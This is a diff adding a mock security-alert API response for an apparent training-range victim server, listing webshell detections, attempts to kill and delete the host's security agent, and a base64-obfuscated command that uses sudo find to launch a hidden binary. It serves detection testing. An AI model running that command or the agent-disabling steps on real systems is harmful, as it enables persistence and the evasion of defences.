@@ -1,0 +1,1431 @@
+{
+  "Count": 15,
+  "CurrentPage": 1,
+  "PageSize": 50,
+  "RequestId": "mock-range-shiro-fastjson-alerts",
+  "SuspEvents": [
+    {
+      "AlarmEventName": "WEBSHELL",
+      "AlarmEventNameDisplay": "发现后门（Webshell）文件",
+      "AlarmEventType": "网站后门",
+      "AlarmEventTypeDisplay": "网站后门",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_file_v2",
+      "Desc": "检测模型在您的服务器上发现了一个可疑的Webshell文件，可能是攻击者成功入侵网站后为维持权限植入的后门文件。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "在您的系统磁盘上发现了一个可疑文件，建议您先确认文件合法性并进行处理。",
+          "ValueDisplay": "在您的系统磁盘上发现了一个可疑文件，建议您先确认文件合法性并进行处理。"
+        },
+        {
+          "NameDisplay": "木马文件路径",
+          "Type": "text",
+          "Value": "/opt/tomcat/webapps/ROOT/static/css/error.jsp",
+          "ValueDisplay": "/opt/tomcat/webapps/ROOT/static/css/error.jsp"
+        },
+        {
+          "NameDisplay": "文件MD5",
+          "Type": "text",
+          "Value": "b38d56b87d61d2cafbe6faf5ab588d52",
+          "ValueDisplay": "b38d56b87d61d2cafbe6faf5ab588d52"
+        },
+        {
+          "NameDisplay": "恶意文件SHA256",
+          "Type": "text",
+          "Value": "2edfa6270fadac14e1423501743d1b81fc642e684fa7317b147b28f5dc4a1663",
+          "ValueDisplay": "2edfa6270fadac14e1423501743d1b81fc642e684fa7317b147b28f5dc4a1663"
+        },
+        {
+          "NameDisplay": "恶意代码高亮显示",
+          "Type": "highlight",
+          "Value": "{\"highlight\":{\"ruleVersion\":\"highlight_20210908\",\"ruleId\":600106,\"events\":[[256,317]]},\"eventLevel\":\"high\",\"knowngraph\":{\"ruleVersion\":\"known-graph-v4\",\"ruleId\":600157,\"events\":{\"filter_signature\":[],\"event_name\":[\"发现网站后门\"],\"label\":[],\"label_key\":\"\"}}}",
+          "ValueDisplay": "{\"highlight\":{\"ruleVersion\":\"highlight_20210908\",\"ruleId\":600106,\"events\":[[256,317]]},\"eventLevel\":\"high\",\"knowngraph\":{\"ruleVersion\":\"known-graph-v4\",\"ruleId\":600157,\"events\":{\"filter_signature\":[],\"event_name\":[\"发现网站后门\"],\"label\":[],\"label_key\":\"\"}}}"
+        },
+        {
+          "NameDisplay": "首次发现时间",
+          "Type": "text",
+          "Value": "2026-04-15 13:20:19",
+          "ValueDisplay": "2026-04-15 13:20:19"
+        },
+        {
+          "NameDisplay": "更新时间",
+          "Type": "text",
+          "Value": "2026-04-15 13:20:19",
+          "ValueDisplay": "2026-04-15 13:20:19"
+        },
+        {
+          "NameDisplay": "木马类型",
+          "Type": "text",
+          "Value": "Webshell",
+          "ValueDisplay": "Webshell"
+        },
+        {
+          "NameDisplay": "源文件下载",
+          "Type": "html",
+          "Value": "<a href=\"https://sas-file-web-20.oss-cn-shanghai.aliyuncs.com/b38d/56b8/7d61/d2ca/fbe6/faf5/ab58/8d52/b38d56b87d61d2cafbe6faf5ab588d52?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=7UXdMFPE4P%2B2P%2Fn9LLaUEISztU0%3D\">下载</a>",
+          "ValueDisplay": "<a href=\"https://sas-file-web-20.oss-cn-shanghai.aliyuncs.com/b38d/56b8/7d61/d2ca/fbe6/faf5/ab58/8d52/b38d56b87d61d2cafbe6faf5ab588d52?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=7UXdMFPE4P%2B2P%2Fn9LLaUEISztU0%3D\">下载</a>"
+        },
+        {
+          "NameDisplay": "源文件预览",
+          "Type": "downloadUrl",
+          "Value": "https://sas-file-web-20.oss-cn-shanghai.aliyuncs.com/b38d/56b8/7d61/d2ca/fbe6/faf5/ab58/8d52/b38d56b87d61d2cafbe6faf5ab588d52?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=7UXdMFPE4P%2B2P%2Fn9LLaUEISztU0%3D",
+          "ValueDisplay": "https://sas-file-web-20.oss-cn-shanghai.aliyuncs.com/b38d/56b8/7d61/d2ca/fbe6/faf5/ab58/8d52/b38d56b87d61d2cafbe6faf5ab588d52?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=7UXdMFPE4P%2B2P%2Fn9LLaUEISztU0%3D"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "WebShell检测是根据文件内容的威胁程度进行打分，这个文件具备了一定的危险功能，本身具有一定的危险特征，但并不完全保证一定是一个网站后门，也可能是一些包含可疑代码的正常网站文件。",
+          "ValueDisplay": "WebShell检测是根据文件内容的威胁程度进行打分，这个文件具备了一定的危险功能，本身具有一定的危险特征，但并不完全保证一定是一个网站后门，也可能是一些包含可疑代码的正常网站文件。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "text",
+          "Value": "如果您确定这个文件确定为WEBSHELL，请将恶意代码注释掉。如果您确定为误报，可以在前台选择忽略、加白或者标记为误报按钮。",
+          "ValueDisplay": "如果您确定这个文件确定为WEBSHELL，请将恶意代码注释掉。如果您确定为误报，可以在前台选择忽略、加白或者标记为误报按钮。"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "WEBSHELL",
+      "HasTraceInfo": true,
+      "Id": 800000015,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "网站后门-发现后门（Webshell）文件",
+      "OccurrenceTime": "2026-04-15 13:20:19",
+      "Stages": "[\"持久化\"]"
+    },
+    {
+      "AlarmEventName": "WEBSHELL",
+      "AlarmEventNameDisplay": "发现后门（Webshell）文件",
+      "AlarmEventType": "网站后门",
+      "AlarmEventTypeDisplay": "网站后门",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_file_v2",
+      "Desc": "检测模型在您的服务器上发现了一个可疑的Webshell文件，可能是攻击者成功入侵网站后为维持权限植入的后门文件。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "在您的系统磁盘上发现了一个可疑文件，建议您先确认文件合法性并进行处理。",
+          "ValueDisplay": "在您的系统磁盘上发现了一个可疑文件，建议您先确认文件合法性并进行处理。"
+        },
+        {
+          "NameDisplay": "木马文件路径",
+          "Type": "text",
+          "Value": "/opt/tomcat/webapps/ROOT/static/js/analytics.jsp",
+          "ValueDisplay": "/opt/tomcat/webapps/ROOT/static/js/analytics.jsp"
+        },
+        {
+          "NameDisplay": "文件MD5",
+          "Type": "text",
+          "Value": "692560eeb6eb3ff74fd1c3a7bd042afd",
+          "ValueDisplay": "692560eeb6eb3ff74fd1c3a7bd042afd"
+        },
+        {
+          "NameDisplay": "恶意文件SHA256",
+          "Type": "text",
+          "Value": "1389de60a24a857c987aa5396b867a7ce10f61cf6d3eba3cdcdd1a8eda57f0f8",
+          "ValueDisplay": "1389de60a24a857c987aa5396b867a7ce10f61cf6d3eba3cdcdd1a8eda57f0f8"
+        },
+        {
+          "NameDisplay": "恶意代码高亮显示",
+          "Type": "highlight",
+          "Value": "{\"highlight\":{\"ruleVersion\":\"highlight_20210908\",\"ruleId\":600106,\"events\":[[280,343]]},\"eventLevel\":\"high\",\"knowngraph\":{\"ruleVersion\":\"known-graph-v4\",\"ruleId\":600157,\"events\":{\"filter_signature\":[],\"event_name\":[\"发现网站后门\"],\"label\":[],\"label_key\":\"\"}}}",
+          "ValueDisplay": "{\"highlight\":{\"ruleVersion\":\"highlight_20210908\",\"ruleId\":600106,\"events\":[[280,343]]},\"eventLevel\":\"high\",\"knowngraph\":{\"ruleVersion\":\"known-graph-v4\",\"ruleId\":600157,\"events\":{\"filter_signature\":[],\"event_name\":[\"发现网站后门\"],\"label\":[],\"label_key\":\"\"}}}"
+        },
+        {
+          "NameDisplay": "首次发现时间",
+          "Type": "text",
+          "Value": "2026-04-15 13:20:29",
+          "ValueDisplay": "2026-04-15 13:20:29"
+        },
+        {
+          "NameDisplay": "更新时间",
+          "Type": "text",
+          "Value": "2026-04-15 13:20:29",
+          "ValueDisplay": "2026-04-15 13:20:29"
+        },
+        {
+          "NameDisplay": "木马类型",
+          "Type": "text",
+          "Value": "Webshell",
+          "ValueDisplay": "Webshell"
+        },
+        {
+          "NameDisplay": "源文件下载",
+          "Type": "html",
+          "Value": "<a href=\"https://sas-file-web-27.oss-cn-shanghai.aliyuncs.com/6925/60ee/b6eb/3ff7/4fd1/c3a7/bd04/2afd/692560eeb6eb3ff74fd1c3a7bd042afd?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=01IToYAzX7RL7Rg7FLSXvlbIIco%3D\">下载</a>",
+          "ValueDisplay": "<a href=\"https://sas-file-web-27.oss-cn-shanghai.aliyuncs.com/6925/60ee/b6eb/3ff7/4fd1/c3a7/bd04/2afd/692560eeb6eb3ff74fd1c3a7bd042afd?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=01IToYAzX7RL7Rg7FLSXvlbIIco%3D\">下载</a>"
+        },
+        {
+          "NameDisplay": "源文件预览",
+          "Type": "downloadUrl",
+          "Value": "https://sas-file-web-27.oss-cn-shanghai.aliyuncs.com/6925/60ee/b6eb/3ff7/4fd1/c3a7/bd04/2afd/692560eeb6eb3ff74fd1c3a7bd042afd?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=01IToYAzX7RL7Rg7FLSXvlbIIco%3D",
+          "ValueDisplay": "https://sas-file-web-27.oss-cn-shanghai.aliyuncs.com/6925/60ee/b6eb/3ff7/4fd1/c3a7/bd04/2afd/692560eeb6eb3ff74fd1c3a7bd042afd?Expires=1778899132&OSSAccessKeyId=LTAI5tRpsF1P6pXqTBeM2X6w&Signature=01IToYAzX7RL7Rg7FLSXvlbIIco%3D"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "WebShell检测是根据文件内容的威胁程度进行打分，这个文件具备了一定的危险功能，本身具有一定的危险特征，但并不完全保证一定是一个网站后门，也可能是一些包含可疑代码的正常网站文件。",
+          "ValueDisplay": "WebShell检测是根据文件内容的威胁程度进行打分，这个文件具备了一定的危险功能，本身具有一定的危险特征，但并不完全保证一定是一个网站后门，也可能是一些包含可疑代码的正常网站文件。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "text",
+          "Value": "如果您确定这个文件确定为WEBSHELL，请将恶意代码注释掉。如果您确定为误报，可以在前台选择忽略、加白或者标记为误报按钮。",
+          "ValueDisplay": "如果您确定这个文件确定为WEBSHELL，请将恶意代码注释掉。如果您确定为误报，可以在前台选择忽略、加白或者标记为误报按钮。"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "WEBSHELL",
+      "HasTraceInfo": true,
+      "Id": 800000014,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "网站后门-发现后门（Webshell）文件",
+      "OccurrenceTime": "2026-04-15 13:20:29",
+      "Stages": "[\"持久化\"]"
+    },
+    {
+      "AlarmEventName": "恶意破坏客户端进程",
+      "AlarmEventNameDisplay": "恶意破坏客户端进程",
+      "AlarmEventType": "精准防御",
+      "AlarmEventTypeDisplay": "精准防御",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测到有可疑的进程变动行为破坏客户端正常运行，为防止该行为破坏实时威胁检测能力，已主动拦截该行为，通常黑客为了入侵主机，常常会破坏安全防护措施，请您重点关注该告警，同时请检查服务器当前是否存在其他安全告警、高危漏洞和弱口令风险，若该行为是您主动的操作行为，请忽略该告警。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "防护客户端正常工作，拦截可疑的破坏行为",
+          "ValueDisplay": "防护客户端正常工作，拦截可疑的破坏行为"
+        },
+        {
+          "NameDisplay": "异常行为描述",
+          "Type": "text",
+          "Value": "该行为尝试关闭客户端进程（已主动拦截该行为）",
+          "ValueDisplay": "该行为尝试关闭客户端进程（已主动拦截该行为）"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "16644",
+          "ValueDisplay": "16644"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/pkill",
+          "ValueDisplay": "/usr/bin/pkill"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "16597",
+          "ValueDisplay": "16597"
+        },
+        {
+          "NameDisplay": "父进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/bash",
+          "ValueDisplay": "/usr/bin/bash"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "bash /tmp/aegis_uninstall.sh",
+          "ValueDisplay": "bash /tmp/aegis_uninstall.sh"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "检测到有可疑的进程变动行为破坏客户端正常运行，为防止该行为破坏实时威胁检测能力，已主动拦截，通常黑客为了入侵主机，常常会破坏安全防护措施。",
+          "ValueDisplay": "检测到有可疑的进程变动行为破坏客户端正常运行，为防止该行为破坏实时威胁检测能力，已主动拦截，通常黑客为了入侵主机，常常会破坏安全防护措施。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "text",
+          "Value": "请您重点关注该告警，同时请检查服务器当前是否存在其他安全告警、高危漏洞和弱口令风险，若该行为是您主动的操作行为，请忽略告警，或者在”功能设置 - 客户端能力配置“中，关闭自保护功能。",
+          "ValueDisplay": "请您重点关注该告警，同时请检查服务器当前是否存在其他安全告警、高危漏洞和弱口令风险，若该行为是您主动的操作行为，请忽略告警，或者在”功能设置 - 客户端能力配置“中，关闭自保护功能。"
+        }
+      ],
+      "EventStatus": 32,
+      "EventSubType": "恶意破坏客户端进程",
+      "HasTraceInfo": true,
+      "Id": 800000013,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "精准防御-恶意破坏客户端进程",
+      "OccurrenceTime": "2026-04-15 13:24:15",
+      "Stages": "[\"影响破坏\"]"
+    },
+    {
+      "AlarmEventName": "恶意破坏客户端文件",
+      "AlarmEventNameDisplay": "恶意破坏客户端文件",
+      "AlarmEventType": "精准防御",
+      "AlarmEventTypeDisplay": "精准防御",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测到有可疑的文件变动行为破坏客户端正常运行，为防止该行为破坏实时威胁检测能力，该行为已被主动拦截，通常黑客为了入侵主机，常常会破坏安全防护措施，请您重点关注该告警，同时请检查服务器当前是否存在其他安全告警、高危漏洞和弱口令风险，若该行为是您主动的操作行为，请忽略该告警。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "防护客户端正常工作，拦截可疑的破坏行为",
+          "ValueDisplay": "防护客户端正常工作，拦截可疑的破坏行为"
+        },
+        {
+          "NameDisplay": "异常行为描述",
+          "Type": "text",
+          "Value": "该行为尝试删除客户端文件（已主动拦截该行为）",
+          "ValueDisplay": "该行为尝试删除客户端文件（已主动拦截该行为）"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "16740",
+          "ValueDisplay": "16740"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/rm",
+          "ValueDisplay": "/usr/bin/rm"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "16704",
+          "ValueDisplay": "16704"
+        },
+        {
+          "NameDisplay": "父进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/bash",
+          "ValueDisplay": "/usr/bin/bash"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "检测到有可疑的文件变动行为破坏客户端正常运行，为防止该行为破坏实时威胁检测能力，已主动拦截，通常黑客为了入侵主机，常常会破坏安全防护措施。如果您在升级系统过程中触发了此告警，请临时关闭自保护，再执行系统升级操作。",
+          "ValueDisplay": "检测到有可疑的文件变动行为破坏客户端正常运行，为防止该行为破坏实时威胁检测能力，已主动拦截，通常黑客为了入侵主机，常常会破坏安全防护措施。如果您在升级系统过程中触发了此告警，请临时关闭自保护，再执行系统升级操作。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "text",
+          "Value": "请您重点关注该告警，同时请检查服务器当前是否存在其他安全告警、高危漏洞和弱口令风险，若该行为是您主动的操作行为，请忽略告警，或者在”功能设置 - 客户端能力配置“中，关闭自保护功能。",
+          "ValueDisplay": "请您重点关注该告警，同时请检查服务器当前是否存在其他安全告警、高危漏洞和弱口令风险，若该行为是您主动的操作行为，请忽略告警，或者在”功能设置 - 客户端能力配置“中，关闭自保护功能。"
+        }
+      ],
+      "EventStatus": 32,
+      "EventSubType": "恶意破坏客户端文件",
+      "HasTraceInfo": true,
+      "Id": 800000012,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "精准防御-恶意破坏客户端文件",
+      "OccurrenceTime": "2026-04-15 13:26:38",
+      "Stages": "[\"影响破坏\"]"
+    },
+    {
+      "AlarmEventName": "linux可疑命令执行",
+      "AlarmEventNameDisplay": "可疑命令执行",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "该进程的命令行异常，与正常进程有较大的区别。",
+          "ValueDisplay": "该进程的命令行异常，与正常进程有较大的区别。"
+        },
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "\t\t  检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。\n          ",
+          "ValueDisplay": "\t\t  检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。\n          "
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash",
+          "ValueDisplay": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "18000",
+          "ValueDisplay": "18000"
+        },
+        {
+          "NameDisplay": "父进程文件路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "4189",
+          "ValueDisplay": "4189"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<pre><code>-[4182]  /bin/sh /opt/tomcat/bin/catalina.sh start\n    -[4189]  /usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start\n</code></pre>\n",
+          "ValueDisplay": "<pre><code>-[4182]  /bin/sh /opt/tomcat/bin/catalina.sh start\n    -[4189]  /usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start\n</code></pre>\n"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "该进程的命令行与正常进程有较大的区别，有可能与恶意软件或黑客有关。",
+          "ValueDisplay": "该进程的命令行与正常进程有较大的区别，有可能与恶意软件或黑客有关。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "linux可疑命令执行",
+      "HasTraceInfo": true,
+      "Id": 800000003,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "进程异常行为-可疑命令执行",
+      "OccurrenceTime": "2026-04-15 13:33:20",
+      "Stages": "[\"代码执行\"]"
+    },
+    {
+      "AlarmEventName": "可疑编码命令",
+      "AlarmEventNameDisplay": "可疑编码命令",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。",
+      "Details": [
+        {
+          "NameDisplay": "数据来源",
+          "Type": "text",
+          "Value": "        进程启动触发检测\n        ",
+          "ValueDisplay": "        进程启动触发检测\n        "
+        },
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "该命令行存在高度可疑的编码特征。",
+          "ValueDisplay": "该命令行存在高度可疑的编码特征。"
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash",
+          "ValueDisplay": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/bash",
+          "ValueDisplay": "/usr/bin/bash"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "18000",
+          "ValueDisplay": "18000"
+        },
+        {
+          "NameDisplay": "父进程文件路径",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java",
+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "4189",
+          "ValueDisplay": "4189"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18000]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash</code></p>\n",
+          "ValueDisplay": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18000]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash</code></p>\n"
+        },
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "该进程的命令行参数中存在编码，并且解码后的内容可疑",
+          "ValueDisplay": "该进程的命令行参数中存在编码，并且解码后的内容可疑"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "该进程的命令行参数中存在编码，并且解码后的内容可疑。攻击者在植入恶意代码时，有可能会先进行编码。",
+          "ValueDisplay": "该进程的命令行参数中存在编码，并且解码后的内容可疑。攻击者在植入恶意代码时，有可能会先进行编码。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
